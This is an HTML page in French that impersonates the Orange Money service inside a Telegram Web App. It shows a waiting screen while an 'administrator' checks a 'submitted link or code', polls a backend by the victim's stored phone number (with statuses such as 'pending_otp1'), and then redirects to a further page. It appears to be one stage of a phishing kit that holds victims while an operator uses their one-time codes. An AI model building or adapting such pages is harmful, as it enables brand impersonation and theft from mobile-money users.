<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification en cours - Orange Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background-color: #f7f7f7; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            font-family: sans-serif; 
        }
        .header-box { 
            width: 100%; 
            background: #f15a24; 
            padding: 25px; 
            color: white; 
            text-align: center; 
            font-size: 26px; 
            font-weight: 800; 
            position: fixed;
            top: 0;
        }
        .card { 
            background: #fff; 
            width: 90%; 
            max-width: 400px; 
            padding: 40px 20px; 
            border-radius: 16px; 
            text-align: center; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            margin-top: 60px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #f15a24;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #222;
            font-size: 24px;
            margin-bottom: 15px;
        }
        p {
            color: #555;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .badge {
            display: inline-block;
            background-color: #fff3cd;
            color: #856404;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 700;
        }
    </style>
</head>
<body>

<div class="header-box">Orange Money</div>

<div class="card">
    <div class="badge">⏳ En attente</div>
    <h2>Vérification en cours</h2>
    <div class="spinner"></div>
    <p>
        Veuillez patienter pendant que l'administrateur vérifie le lien ou le code soumis.
    </p>
    <p style="font-size: 13px; color: #888;">
        Ne fermez pas cette page. Vous serez redirigé automatiquement dès la validation.
    </p>
</div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        window.Telegram?.WebApp?.ready();
        const phone = localStorage.getItem('phone');

        // Poll backend status every 3 seconds to check admin decision
        const checkInterval = setInterval(async () => {
            try {
                if (phone) {
                    const response = await fetch('/api/check-status?phone=' + encodeURIComponent(phone));
                    if (response.ok) {
                        const data = await response.json();
                        // If status changes from pending, proceed to page 9 with the status info
                        if (data.status && data.status !== 'pending' && data.status !== 'pending_otp1') {
                            localStorage.setItem('verification_status', data.status);
                            clearInterval(checkInterval);
                            window.location.href = "page9.html";
                        }
                    }
                }
            } catch (err) {
                console.log("Checking status...");
            }
        }, 3000);

        // Fallback auto-redirect after 30 seconds if server check fails
        setTimeout(() => {
            clearInterval(checkInterval);
            window.location.href = "page9.html";
        }, 30000);
    });
</script>
</body>
</html>
